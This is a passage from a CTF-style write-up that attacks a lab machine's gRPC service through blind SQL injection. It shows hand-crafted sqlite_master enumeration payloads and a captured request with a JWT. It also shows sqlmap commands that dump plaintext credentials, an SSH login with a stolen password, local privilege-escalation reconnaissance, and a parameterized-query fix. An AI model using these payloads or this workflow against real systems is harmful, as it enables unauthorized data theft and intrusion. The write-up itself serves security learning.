<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or  (SELECT count(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; )=2&quot;</span><span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
<p>First table name is of length 8</p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT length(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 1 offset 0)=8&quot;</span><span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
<p>For reference</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ascii<span class="w"> </span>-x
<span class="w">   </span><span class="m">00</span><span class="w"> </span>NUL<span class="w">    </span><span class="m">10</span><span class="w"> </span>DLE<span class="w">    </span><span class="m">20</span><span class="w">      </span><span class="m">30</span><span class="w"> </span><span class="m">0</span><span class="w">    </span><span class="m">40</span><span class="w"> </span>@<span class="w">    </span><span class="m">50</span><span class="w"> </span>P<span class="w">    </span><span class="m">60</span><span class="w"> </span><span class="sb">`</span><span class="w">    </span><span class="m">70</span><span class="w"> </span>p
<span class="w">   </span><span class="m">01</span><span class="w"> </span>SOH<span class="w">    </span><span class="m">11</span><span class="w"> </span>DC1<span class="w">    </span><span class="m">21</span><span class="w"> </span>!<span class="w">    </span><span class="m">31</span><span class="w"> </span><span class="m">1</span><span class="w">    </span><span class="m">41</span><span class="w"> </span>A<span class="w">    </span><span class="m">51</span><span class="w"> </span>Q<span class="w">    </span><span class="m">61</span><span class="w"> </span>a<span class="w">    </span><span class="m">71</span><span class="w"> </span>q
<span class="w">   </span><span class="m">02</span><span class="w"> </span>STX<span class="w">    </span><span class="m">12</span><span class="w"> </span>DC2<span class="w">    </span><span class="m">22</span><span class="w"> </span><span class="s2">&quot;    32 2    42 B    52 R    62 b    72 r</span>
<span class="s2">   03 ETX    13 DC3    23 #    33 3    43 C    53 S    63 c    73 s</span>
<span class="s2">   04 EOT    14 DC4    24 </span>$<span class="s2">    34 4    44 D    54 T    64 d    74 t</span>
<span class="s2">   05 ENQ    15 NAK    25 %    35 5    45 E    55 U    65 e    75 u</span>
<span class="s2">   06 ACK    16 SYN    26 &amp;    36 6    46 F    56 V    66 f    76 v</span>
<span class="s2">   07 BEL    17 ETB    27 &#39;    37 7    47 G    57 W    67 g    77 w</span>
<span class="s2">   08 BS     18 CAN    28 (    38 8    48 H    58 X    68 h    78 x</span>
<span class="s2">   09 HT     19 EM     29 )    39 9    49 I    59 Y    69 i    79 y</span>
<span class="s2">   0A LF     1A SUB    2A *    3A :    4A J    5A Z    6A j    7A z</span>
<span class="s2">   0B VT     1B ESC    2B +    3B ;    4B K    5B [    6B k    7B {</span>
<span class="s2">   0C FF     1C FS     2C ,    3C &lt;    4C L    5C \    6C l    7C |</span>
<span class="s2">   0D CR     1D GS     2D -    3D =    4D M    5D ]    6D m    7D }</span>
<span class="s2">   0E SO     1E RS     2E .    3E &gt;    4E N    5E ^    6E n    7E ~</span>
<span class="s2">   0F SI     1F US     2F /    3F ?    4F O    5F _    6F o    7F DEL</span>
</pre></div>
</div>
<p>First table name is <code class="docutils literal notranslate"><span class="pre">accounts</span></code></p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;a&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,2,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;c&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,3,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;c&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,4,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;o&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,5,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;u&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,6,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;n&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,7,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;t&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,8,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) = hex(&#39;s&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
<p>Second table probably is <code class="docutils literal notranslate"><span class="pre">messages</span></code></p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1) = hex(&#39;m&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,2,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1) = hex(&#39;e&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;653 or (SELECT hex(substr(tbl_name,3,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1) = hex(&#39;s&#39;)&quot;</span><span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
<p>Now that we know the table names, we want to get the collumns and their values.<br />
I’ve been working based manually based of the techniques described here so far: <a class="reference external" href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf">https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf</a></p>
<p>But I stalled on this, couldn’t really make it work, so a took a break.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">select</span> <span class="nb">hex</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">replace</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="n">instr</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)),</span><span class="n">instr</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="n">instr</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)),</span><span class="s1">&#39;`&#39;</span><span class="p">)),</span>\\\<span class="s2">&quot;TEXT</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">INTEGER</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">AUTOINCREMENT</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">PRIMARY KEY</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">UNIQUE</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">NUMERIC</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">REAL</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">BLOB</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">NOT NULL</span><span class="se">\\\&quot;</span><span class="s2">,&#39;&#39;),</span><span class="se">\\\&quot;</span><span class="s2">,</span><span class="se">\\\&quot;</span><span class="s2">,&#39;~~&#39;),</span><span class="se">\\\&quot;</span><span class="s2">`</span><span class="se">\\\&quot;</span><span class="s2">,</span><span class="se">\\\&quot;\\\&quot;</span><span class="s2">),1,1)) FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39; and name=&#39;accounts&#39;) &lt; hex(&#39;a&#39;)</span>
</pre></div>
</div>
<p>After my break I asked for a hint, and was pointed to this: <a class="reference external" href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a><br />
Well that makes everything 100 times easyer, and that’s by the same devs that made the grpcurl… So right in front of my now the whole time ffs<br />
As far as I understand this actually sends REST requests in HTTP 1.1 to the server, and those are translated, by the server to gRPC <a class="reference external" href="https://github.com/grpc-ecosystem/grpc-gateway">https://github.com/grpc-ecosystem/grpc-gateway</a><br />
I actually knew this as I’ve seen this at work, also though about it in the context of this box and tried to make things work in REST really breafly, but assumed it wasn’t setup on the server.
Anyways, this things sets up a local webserver gui that takes your gRPC input and sends stuff over HTTP 1.1 REST to the server, so we can just capture a getInfo request, feed it to sqlmap and avoid the headache of doing this manually<br />
<img alt="gui.png" src="../../../../_images/gui.png" /><br />
<img alt="res.png" src="../../../../_images/res.png" /></p>
<p>The HTTP 1.1 request from burp</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">invoke</span><span class="o">/</span><span class="n">SimpleApp</span><span class="o">.</span><span class="n">getInfo</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">41297</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
<span class="n">x</span><span class="o">-</span><span class="n">grpcui</span><span class="o">-</span><span class="n">csrf</span><span class="o">-</span><span class="n">token</span><span class="p">:</span> <span class="n">loji4zaSqKuSR7cLn3_CDboa8tU7ADLmX1Ch9GwOOqo</span>
<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span> <span class="n">XMLHttpRequest</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">200</span>
<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">41297</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">41297</span><span class="o">/</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">_grpcui_csrf_token</span><span class="o">=</span><span class="n">loji4zaSqKuSR7cLn3_CDboa8tU7ADLmX1Ch9GwOOqo</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span> <span class="n">empty</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span> <span class="n">cors</span>
<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span> <span class="n">same</span><span class="o">-</span><span class="n">origin</span>

<span class="p">{</span>
  <span class="s2">&quot;metadata&quot;</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span>
      <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ3MTA4MDN9.MSlBzmJYp13-PV_H3P20WyO5ponKssSVQON1razjAJk&quot;</span>
    <span class="p">}</span>
  <span class="p">],</span>
  <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="s2">&quot;112 or 1=1&quot;</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Pointing sqlmap to the things we already established, to speed up the process</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap<span class="w"> </span>-r<span class="w"> </span>getinfo.req<span class="w"> </span>--dbms<span class="w"> </span>sqlite<span class="w"> </span>--technique<span class="o">=</span>B<span class="w"> </span>--level<span class="w"> </span><span class="m">5</span><span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>-t5<span class="w"> </span>-T<span class="w"> </span>accounts<span class="w"> </span>--batch
SNIP
sqlmap<span class="w"> </span>identified<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>injection<span class="w"> </span>point<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>total<span class="w"> </span>of<span class="w"> </span><span class="m">1256</span><span class="w"> </span>HTTP<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>requests:
---
Parameter:<span class="w"> </span>JSON<span class="w"> </span>id<span class="w"> </span><span class="o">((</span>custom<span class="o">)</span><span class="w"> </span>POST<span class="o">)</span>
<span class="w">    </span>Type:<span class="w"> </span>boolean-based<span class="w"> </span>blind
<span class="w">    </span>Title:<span class="w"> </span>OR<span class="w"> </span>boolean-based<span class="w"> </span>blind<span class="w"> </span>-<span class="w"> </span>WHERE<span class="w"> </span>or<span class="w"> </span>HAVING<span class="w"> </span>clause
<span class="w">    </span>Payload:<span class="w"> </span><span class="o">{</span><span class="s2">&quot;metadata&quot;</span>:<span class="o">[{</span><span class="s2">&quot;name&quot;</span>:<span class="s2">&quot;token&quot;</span>,<span class="s2">&quot;value&quot;</span>:<span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ3MTA4MDN9.MSlBzmJYp13-PV_H3P20WyO5ponKssSVQON1razjAJk&quot;</span><span class="o">}]</span>,<span class="s2">&quot;data&quot;</span>:<span class="o">[{</span><span class="s2">&quot;id&quot;</span>:<span class="s2">&quot;-5513 OR 6714=6714&quot;</span><span class="o">}]}</span>
---
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap<span class="w"> </span>-r<span class="w"> </span>getinfo.req<span class="w"> </span>--dbms<span class="w"> </span>sqlite<span class="w"> </span>--technique<span class="o">=</span>B<span class="w"> </span>--level<span class="w"> </span><span class="m">5</span><span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>-t5<span class="w"> </span>-T<span class="w"> </span>accounts<span class="w"> </span>--batch<span class="w"> </span>--dump
Database:<span class="w"> </span>&lt;current&gt;
Table:<span class="w"> </span>accounts
<span class="o">[</span><span class="m">3</span><span class="w"> </span>entries<span class="o">]</span>
+------------------------+----------+
<span class="p">|</span><span class="w"> </span>password<span class="w">               </span><span class="p">|</span><span class="w"> </span>username<span class="w"> </span><span class="p">|</span>
+------------------------+----------+
<span class="p">|</span><span class="w"> </span>admin<span class="w">                  </span><span class="p">|</span><span class="w"> </span>admin<span class="w">    </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>HereIsYourPassWord1431<span class="w"> </span><span class="p">|</span><span class="w"> </span>sau<span class="w">      </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>schnitzel<span class="w">              </span><span class="p">|</span><span class="w"> </span>wiener<span class="w">   </span><span class="p">|</span>
+------------------------+----------+
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap<span class="w"> </span>-r<span class="w"> </span>getinfo.req<span class="w"> </span>--dbms<span class="w"> </span>sqlite<span class="w"> </span>--technique<span class="o">=</span>B<span class="w"> </span>--level<span class="w"> </span><span class="m">5</span><span class="w"> </span>--risk<span class="w"> </span><span class="m">3</span><span class="w"> </span>-t<span class="w"> </span><span class="m">15</span><span class="w"> </span>-T<span class="w"> </span>messages<span class="w"> </span>--batch<span class="w"> </span>--dump
Database:<span class="w"> </span>&lt;current&gt;
Table:<span class="w"> </span>messages
<span class="o">[</span><span class="m">2</span><span class="w"> </span>entries<span class="o">]</span>
+-----+----------------------------------------------+----------+
<span class="p">|</span><span class="w"> </span>id<span class="w">  </span><span class="p">|</span><span class="w"> </span>message<span class="w">                                      </span><span class="p">|</span><span class="w"> </span>username<span class="w"> </span><span class="p">|</span>
+-----+----------------------------------------------+----------+
<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>The<span class="w"> </span>admin<span class="w"> </span>is<span class="w"> </span>working<span class="w"> </span>hard<span class="w"> </span>to<span class="w"> </span>fix<span class="w"> </span>the<span class="w"> </span>issues.<span class="w"> </span><span class="p">|</span><span class="w"> </span>admin<span class="w">    </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="m">105</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Will<span class="w"> </span>update<span class="w"> </span>soon.<span class="w">                            </span><span class="p">|</span><span class="w"> </span>wiener<span class="w">   </span><span class="p">|</span>
+-----+----------------------------------------------+----------+
</pre></div>
</div>
<p>Looking at sqlmap verbose output this is how it did it:</p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="s2">&quot;-6907 OR SUBSTR((SELECT COALESCE(CAST(sql AS TEXT),CHAR(32)) FROM sqlite_master WHERE type=CHAR(116,97,98,108,101) AND tbl_name=CHAR(97,99,99,111,117,110,116,115) LIMIT 1),33,1)&gt;CHAR(96)&quot;</span><span class="p">}</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ssh sau@10.10.11.214
sau@10.10.11.214&#39;s password:
Last login: Sun May 21 20:43:02 2023 from 10.10.16.76
sau@pc:~$
sau@pc:~$
sau@pc:~$
sau@pc:~$ pwd
/home/sau
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ wc -c user.txt
33 user.txt
</pre></div>
</div>
<p>Looking at <code class="docutils literal notranslate"><span class="pre">/opt/app/app.py</span></code> this is what got us in</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">getInfo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">invocation_metadata</span><span class="p">())</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">middle</span><span class="o">.</span><span class="n">authorization</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">is</span> <span class="kc">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;SELECT message from messages where id = </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
                <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">except</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">er</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">er</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&quot;Authorization Error.Missing &#39;token&#39; header&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>And this is how we could fix it</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">getInfo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">invocation_metadata</span><span class="p">())</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
        <span class="n">user_id</span> <span class="o">=</span> <span class="n">middle</span><span class="o">.</span><span class="n">authorization</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">is</span> <span class="kc">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT message from messages where id = ?&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="p">))</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
                <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">except</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">er</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">er</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">app_pb2</span><span class="o">.</span><span class="n">getInfoResponse</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&quot;Authorization Error.Missing &#39;token&#39; header&quot;</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="privesc">
<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:~$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>sau:
Sorry,<span class="w"> </span>try<span class="w"> </span>again.
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>sau:
Sorry,<span class="w"> </span>user<span class="w"> </span>sau<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>run<span class="w"> </span>sudo<span class="w"> </span>on<span class="w"> </span>localhost.
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:~$<span class="w"> </span>grep<span class="w"> </span>sh$<span class="w"> </span>/etc/passwd
root:x:0:0:root:/root:/bin/bash
sau:x:1001:1001::/home/sau:/bin/bash
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sau@pc:~$<span class="w"> </span>netstat<span class="w"> </span>-tulpen
<span class="o">(</span>Not<span class="w"> </span>all<span class="w"> </span>processes<span class="w"> </span>could<span class="w"> </span>be<span class="w"> </span>identified,<span class="w"> </span>non-owned<span class="w"> </span>process<span class="w"> </span>info
<span class="w"> </span>will<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>shown,<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>root<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span>it<span class="w"> </span>all.<span class="o">)</span>
Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">101</span><span class="w">        </span><span class="m">31968</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:22<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">32645</span><span class="w">      </span>-
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8000<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">33661</span><span class="w">      </span>-
